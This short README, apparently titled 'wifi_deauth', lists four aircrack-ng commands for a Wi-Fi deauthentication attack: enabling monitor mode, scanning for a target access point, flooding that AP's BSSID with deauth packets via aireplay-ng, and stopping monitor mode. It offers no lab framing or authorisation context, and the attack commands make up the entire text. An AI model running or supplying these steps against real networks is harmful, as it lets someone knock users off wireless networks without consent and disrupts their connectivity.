# wifi_deauth

## Put Wi-Fi Adapter into Monitor Mode:

        sudo airmon-ng start <interface>

## Identify Target Access Point (AP):

        sudo airodump-ng <interface>

## Deauthenticate Devices from the AP:

        sudo aireplay-ng --deauth <number_of_deauth_packets> -a <BSSID> <interface>

## Stop Monitor mode

        sudo airmon-ng stop <interface>


